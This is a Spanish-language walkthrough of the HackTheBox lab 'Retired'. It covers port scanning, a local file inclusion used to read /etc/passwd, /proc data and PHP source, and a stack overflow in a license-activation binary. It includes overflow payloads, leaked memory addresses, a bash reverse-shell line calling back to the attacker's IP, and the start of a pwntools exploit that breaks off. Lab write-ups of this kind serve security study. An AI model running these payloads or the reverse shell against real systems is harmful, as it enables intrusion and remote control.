# WriteUp HackTheBox Retired

[Nota]: esta maquina fue realizada según el WriteUp realizado por S4vitar

## Descripción de la máquina

![Retired_Image](Images/Retired.png)

La resolución de la máquina presenta las siguiente fases:

* Reconocimiento
    * nmap
* Explotación
* Escalada de privilegios

## Fase de Reconocimiento

Se realiza una prueba de ping para confirmar que haya conexión con la máquina

```console
ping 10.10.11.154 -c1
```

```
PING 10.10.11.154 (10.10.11.154) 56(84) bytes of data.
64 bytes from 10.10.11.154: icmp_seq=1 ttl=63 time=127 ms

--- 10.10.11.154 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 127.003/127.003/127.003/0.000 ms
```

Para identificar el sistema operativo usamos la utilidad proporcionada por S4vitar whichSystem.py[^1]

[^1]: la utilidad se puede descargar de <https://github.com/Akronox/WichSystem.py>

```console
whichSystem.py 10.10.11.154
```

```
10.10.11.154 (ttl -> 63): Linux
```

Se realiza una revisión de puertos con nmap con las siguientes opciones

* -p-: Para realizar el escaneo en todos los 65000 puertos TCP
* --open: Para reportar solamente los puertos que se encuentran abiertos
* -sS: TCP SYN port scan, este argumento se utiliza para realizar un escaneo rapido de puertos
* --min-rate: El argumento le exige a nmap realizar el escaneo con una tasa de paquetes por segundo no menor a la solicitada
* -vvv: triple verbose para mostrar más información
* -n: para que no realice resolución dns en el scaneo
* -Pn: Desabilita el descubrimiento del host a traves de ping
* -oG: exporta lo reportado en un archivo en formato grepeable

```console
sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.11.154 -oG nmap/allPorts
```

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-25 11:16 -04
Initiating Parallel DNS resolution of 1 host. at 11:16
Completed Parallel DNS resolution of 1 host. at 11:16, 0.10s elapsed
DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:16
Scanning 10.10.11.154 [65535 ports]
Discovered open port 80/tcp on 10.10.11.154
Discovered open port 22/tcp on 10.10.11.154
Completed SYN Stealth Scan at 11:16, 13.82s elapsed (65535 total ports)
Nmap scan report for 10.10.11.154
Host is up, received user-set (0.13s latency).
Scanned at 2022-08-25 11:16:02 -04 for 14s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds
           Raw packets sent: 67963 (2.990MB) | Rcvd: 67665 (2.707MB)
```

Por comodidad usamos la utilidad proporcionada por S4vitar extractPorts la cual nos ayuda a revisar el archivo creado por nmap 'all Ports' y nos copia los puertos en la clipboard para su posterior uso; se adjunta la utilidad a continuación

```console
extractPorts () {
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
        /bin/bat extractPorts.tmp
        rm extractPorts.tmp

```

Ejecutamos el comando extractPorts

```console
extractPorts nmap/allPorts
```

```
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.11.154
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
```

Se realiza un nuevo escaneo con una serie de scripts básicos que nmap nos ofrece para ver las técnologias que corren por detrás

```console
nmap -sCV -pXXX  10.10.11.154 -oN nmap/targeted 
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-25 11:22 -04
Nmap scan report for 10.10.11.154
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.33 seconds
```

Realizamos un whatweb para ver que nos resuelve, pero solo vemos que nos redirigé un una pagina en el mismo servidor pero vemos que est'a buscando un archivo

```console
whatweb 10.10.11.154
```

```
http://10.10.11.154 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.10.11.154], RedirectLocation[/index.php?page=default.html], nginx
http://10.10.11.154/index.php?page=default.html [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[10.10.11.154], Script, Title[Agency - Start Bootstrap Theme], nginx
```

## Fase de Explotación

Probamos con Curl revisar si se puede leer otros archivos del sistema y vemos que podemos leer archivos del sistema lo que nos da un LFI (Local File Inclusion)

```console
curl -s -X GET "http://10.10.11.154/index.php?page=/etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000::/vagrant:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dev:x:1001:1001::/home/dev:/bin/bash
```

Probamos revisar si el equipo está en un contenedor o tiene más interfaces conectadas, sin embargo vemos que solamente tiene la interfazz loopback y la IP real de la victima

```console
curl -s -X GET "http://10.10.11.154/index.php?page=/proc/net/fib_trie" | grep "host LOCAL" -B 1 | grep -oP '\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' | sort -u
```

```
10.10.11.154
127.0.0.1
```

Por otra parte vemos los puertos que están abiertos en el /proc/net/tcp y vemos un puerto nuevo `1337`

```console
for port in $(curl -s -X GET "http://10.10.11.154/index.php?page=/proc/net/tcp" | awk '{print $2}' | grep -v "address" | awk '{print$2}' FS=":" | sort -u); do echo "[+] Port $port -> $((16#$port))"; done
```

```
[+] Port 0016 -> 22
[+] Port 0050 -> 80
[+] Port 0539 -> 1337
```

Por otra parte vemos el archivo php y vemos que no nos los interpreta y podemos revisar el codigo

```console
curl -s -X GET "http://10.10.11.154/index.php?page=index.php"
```

```php
<?php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}

readfile($page);
?>
```

Para ver que archivos podemos ver o que otros dominios se tienen realizamos un fuzzeo al servidor buscando archivos htmp y php y observamos que encontramos una nueva página llamada *beta.html*

```console
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,html-php http://10.10.11.154/FUZZ.FUZ2Z
```

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.154/FUZZ.FUZ2Z
Total requests: 441094

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000053:   200        188 L    824 W      11414 Ch    "default - html"                                                                                                            
000000004:   302        0 L      0 W        0 Ch        "index - php"                                                                                                               
000001805:   200        72 L     304 W      4144 Ch     "beta - html"
```

Ingresando a la nueva página vemos que se puede subir un archivo

![beta-html](Images/imagen01)

Probando subiendo un archivo cualquiera y vemos que nos redirige a una pagina *activate_license.php*

![activate-page](Images/imagen02)

Leyendo el archivo nos damos cuenta que utiliza el puerto 1337 

```console
curl -s -X GET "http://10.10.11.154/index.php?page=activate_license.php"
```

```php
<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>
```

Si revisamos los procesos que se encuentran corriendo en la máquina vemos que hay un proceso llamado *activate_licens* con un PID 409

```console
curl -s -X GET "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep lic
```

```
[...]
 S    HangDetector   488     25845.920588      2089   120         0.000000        75.457239         0.000000 0 0 /
 S           gmain   500     19726.470186       149   120         0.000000         1.288983         0.000000 0 0 /
 S     card0-crtc3   401         0.391783         2    49         0.000000         0.007929         0.000000 0 0 /
 S activate_licens   409     23766.370215        13   120         0.000000         2.683163         0.000000 0 0 /
 S        rsyslogd   414     25431.129072        41   120         0.000000         5.287543         0.000000 0 0 /
 S     in:imuxsock   417     25842.231307       950   120         0.000000        26.034812         0.000000 0 0 /
[...]
```

Revisando cómo ha sido ejecutado el proceso en */proc/{PID}/cmdline* vemos que no nos sale nada

```console
curl -s -X GET "http://10.10.11.154/index.php?page=/proc/409/cmdline"
```

Sin embargo cuando lo pasamos por Burpsuite para ver la respuesta de la solicitud vemos cómo se ejecutó

```console
curl -s -X GET "http://10.10.11.154/index.php?page=/proc/409/cmdline" --proxy http://127.0.0.1:8080
```

![cmdline](Images/imagen03.png)

Nos descargamos el binario para analizarlo

```console
curl -s -X GET "http://10.10.11.154/index.php?page=/usr/bin/activate_license" --output content/activate_license
```

Vemos que se haya descargado correctamente

```console
file content/activate_license
```

```
content/activate_license: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped
```

le damos permisos de ejecución

```console
chmod +x content/activate_license
```

Realizamos un análisis con *Ghidra* y observamos que realiza una revision a los 4 primeros carácteres que se le manda a la aplicación y revisa que el archivo que le llega tenga 512 bits

![ghidra-analisis](Images/imagen04.png)

Iniciamos el binario con *gdb* para ver que sucede

```console
gdb content/activate_license -q
```

```
Reading symbols from content/activate_license...
(gdb)
```

E iniciamos en escucha en el puerto 1212 para realizar pruebas

```console
(gdb) r 1212
```

```
Starting program: /home/mzapata/HTB/writeups/Retired/content/activate_license 1212
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] starting server listening on port 1212
[+] listening ...
```

Realizamos una prueba mandando 512 bits y una gran cantidad de información para ver qué sucede y vemos que se está creando un proceso child en el intento

```console
printf "\x00\x00\x02\x00$(python3 -c 'print("A"*1000)')" | nc localhost 1212
```

```
[...]
[Detaching after fork from child process 615770]
[...]
```

Reiniciamos nuevamente gdb en un nuevo puerto 1213 y seteamos la opción de follow-fork-mode child

```console
gdb content/activate_license -q
```

```
Reading symbols from content/activate_license...
```

```console
(gdb) set follow-fork-mode child
(gdb) r 1213
```

```
Starting program: /home/mzapata/HTB/writeups/Retired/content/activate_license 1213
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] starting server listening on port 1213
[+] listening ...
```

y al realizar una prueba vemos que gdb se detine de escuchar pero no sucede nada más

```console
printf "\x00\x00\x02\x00$(python3 -c 'print("A"*1000)')" | nc localhost 1213
```

```
[+] accepted client connection from 255.127.0.0:65535
[Attaching after Thread 0x7ffff7b3a400 (LWP 619857) fork to child process 620684]
[New inferior 2 (process 620684)]
[Detaching after fork from parent process 619857]
[Inferior 1 (process 619857) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] reading 512 bytes
[+] activated license: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
[Inferior 2 (process 620684) exited normally]
(gdb)
```

Sin embargo cuando aumentamos el número de bits de 512 (\x00\x00\x02\x00) a un número mayor \x00\x00\x03\x00 vemos que el programa falla

```console
printf "\x00\x00\x03\x00$(python3 -c 'print("A"*1000)')" | nc localhost 1312
```

```
gef➤  [+] reading 768 bytes
[+] activated license: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����

Thread 2.1 "activate_licens" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff7b3a400 (LWP 639160)]
0x00005555555555c0 in activate_license (sockfd=0x4) at activate_license.c:64
64	activate_license.c: No existe el fichero o el directorio.

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x31e             
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x007ffff7b3a400  →  0x007ffff7b3a400  →  [loop detected]
$rsp   : 0x007fffffffe658  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x0               
$rdi   : 0x007fffffffdec0  →  0x007ffff7cff090  →  <funlockfile+0> mov rdi, QWORD PTR [rdi+0x88]
$rip   : 0x005555555555c0  →  <activate_license+643> ret 
$r8    : 0xfffffffffffffff7
$r9    : 0x31e             
$r10   : 0x007fffffffe450  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$r11   : 0x246             
$r12   : 0x00555555555220  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffe658│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	 ← $rsp
0x007fffffffe660│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffe668│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffe670│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffe678│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffe680│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffe688│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffe690│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555555b9 <activate_license+636> call   0x5555555550b0 <printf@plt>
   0x5555555555be <activate_license+641> nop    
   0x5555555555bf <activate_license+642> leave  
 → 0x5555555555c0 <activate_license+643> ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "activate_licens", stopped 0x5555555555c0 in activate_license (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555555c0 → activate_license(sockfd=0x4)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Revisamos las protecciones que tiene el binario y vemos que tiene lo siguiente

1. PIE enabled: Position Independent Executable - Un binario PIE y todas sus dependencias se cargan en ubicaciones aleatorias dentro de la memoria virtual cada vez que se ejecuta la aplicación. Esto hace que los ataques de programación orientada al retorno (ROP) sean mucho más difíciles de ejecutar de manera confiable.

```console
checksec --file=activate_license
```

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   100) Symbols	  No	0
```

Revisando las rutas aleatorias que genera los archivos vemos lo siguiente:

```console
curl -s -X GET "http://10.10.11.154/index.php?page=/proc/409/maps"
```

```
559ed01a1000-559ed01a2000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
559ed01a2000-559ed01a3000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
559ed01a3000-559ed01a4000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
559ed01a4000-559ed01a5000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
559ed01a5000-559ed01a6000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
559ed0c90000-559ed0cb1000 rw-p 00000000 00:00 0                          [heap]
7fb97e2d9000-7fb97e2db000 rw-p 00000000 00:00 0 
7fb97e2db000-7fb97e2dc000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7fb97e2dc000-7fb97e2de000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7fb97e2de000-7fb97e2df000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7fb97e2df000-7fb97e2e0000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7fb97e2e0000-7fb97e2e1000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7fb97e2e1000-7fb97e2e8000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7fb97e2e8000-7fb97e2f8000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7fb97e2f8000-7fb97e2fd000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7fb97e2fd000-7fb97e2fe000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7fb97e2fe000-7fb97e2ff000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7fb97e2ff000-7fb97e303000 rw-p 00000000 00:00 0 
7fb97e303000-7fb97e312000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7fb97e312000-7fb97e3ac000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7fb97e3ac000-7fb97e445000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7fb97e445000-7fb97e446000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7fb97e446000-7fb97e447000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7fb97e447000-7fb97e46c000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fb97e46c000-7fb97e5b7000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fb97e5b7000-7fb97e601000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fb97e601000-7fb97e602000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fb97e602000-7fb97e605000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fb97e605000-7fb97e608000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fb97e608000-7fb97e60c000 rw-p 00000000 00:00 0 
7fb97e60c000-7fb97e61c000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fb97e61c000-7fb97e714000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fb97e714000-7fb97e748000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fb97e748000-7fb97e74c000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fb97e74c000-7fb97e74f000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fb97e74f000-7fb97e751000 rw-p 00000000 00:00 0 
7fb97e756000-7fb97e757000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fb97e757000-7fb97e777000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fb97e777000-7fb97e77f000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fb97e780000-7fb97e781000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fb97e781000-7fb97e782000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fb97e782000-7fb97e783000 rw-p 00000000 00:00 0 
7ffec7fba000-7ffec7fdb000 rw-p 00000000 00:00 0                          [stack]
7ffec7fdd000-7ffec7fe1000 r--p 00000000 00:00 0                          [vvar]
7ffec7fe1000-7ffec7fe3000 r-xp 00000000 00:00 0                          [vdso]
```

Por tanto no traemos también el archivo */usr/lib/x86_64-linux-gnu/libm-2.31.so* 

```console
curl -s -X GET "http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so" --output libc-2.31.so
chmod +x libc-2.31.so
```

Revisamos la dirección que usa el sistema:

```console
readelf -s libc-2.31.so | grep system
```

```
1430: 0000000000048e50    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
```

Observamos con *rabin2* las secciones y permisos a los que tiene acceso el binario y vemos que tiene acceso de escritura al directorio .data

```console
rabin2 -S activate_license
```

```
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- 
1   0x000002a8   0x1c 0x000002a8   0x1c -r-- .interp
2   0x000002c4   0x24 0x000002c4   0x24 -r-- .note.gnu.build-id
3   0x000002e8   0x20 0x000002e8   0x20 -r-- .note.ABI-tag
4   0x00000308   0x28 0x00000308   0x28 -r-- .gnu.hash
5   0x00000330  0x390 0x00000330  0x390 -r-- .dynsym
6   0x000006c0  0x1cc 0x000006c0  0x1cc -r-- .dynstr
7   0x0000088c   0x4c 0x0000088c   0x4c -r-- .gnu.version
8   0x000008d8   0x30 0x000008d8   0x30 -r-- .gnu.version_r
9   0x00000908   0xd8 0x00000908   0xd8 -r-- .rela.dyn
10  0x000009e0  0x2d0 0x000009e0  0x2d0 -r-- .rela.plt
11  0x00001000   0x17 0x00001000   0x17 -r-x .init
12  0x00001020  0x1f0 0x00001020  0x1f0 -r-x .plt
13  0x00001210    0x8 0x00001210    0x8 -r-x .plt.got
14  0x00001220  0x601 0x00001220  0x601 -r-x .text
15  0x00001824    0x9 0x00001824    0x9 -r-x .fini
16  0x00002000  0x18b 0x00002000  0x18b -r-- .rodata
17  0x0000218c   0x4c 0x0000218c   0x4c -r-- .eh_frame_hdr
18  0x000021d8  0x140 0x000021d8  0x140 -r-- .eh_frame
19  0x00002cb8    0x8 0x00003cb8    0x8 -rw- .init_array
20  0x00002cc0    0x8 0x00003cc0    0x8 -rw- .fini_array
21  0x00002cc8  0x200 0x00003cc8  0x200 -rw- .dynamic
22  0x00002ec8  0x138 0x00003ec8  0x138 -rw- .got
23  0x00003000   0x10 0x00004000   0x10 -rw- .data
24  0x00003010    0x0 0x00004010    0x8 -rw- .bss
25  0x00003010   0x27 0x00000000   0x27 ---- .comment
26  0x00003037   0x30 0x00000000   0x30 ---- .debug_aranges
27  0x00003067  0x688 0x00000000  0x688 ---- .debug_info
28  0x000036ef  0x1b9 0x00000000  0x1b9 ---- .debug_abbrev
29  0x000038a8  0x28a 0x00000000  0x28a ---- .debug_line
30  0x00003b32  0x577 0x00000000  0x577 ---- .debug_str
31  0x000040b0  0x960 0x00000000  0x960 ---- .symtab
32  0x00004a10  0x437 0x00000000  0x437 ---- .strtab
33  0x00004e47  0x13e 0x00000000  0x13e ---- .shstrtab
```

De esta manera obtenemos los siguientes datos:

* active_license_base = 559ed01a1000
* libc_base = 0x7fb97e447000
* writable = active_license_base + 0x00004000
* ofset = 520
* cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'"


Y con estos datos realizamos el siguiente exploit en python:

```python
#!/usr/bin/python3

from pwn import *
import threading, signal, pdb, requests, sys

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

upload_url = "http://10.10.11.154/activate_license.php"
lport = 443
burp = {'http': 'http:/127.0.0.1:8080'}

def makeExploit():

    active_license_base = 0x559ed01a1000
    libc_base = 0x7fb97e447000

    writable = active_license_base + 0x00004000

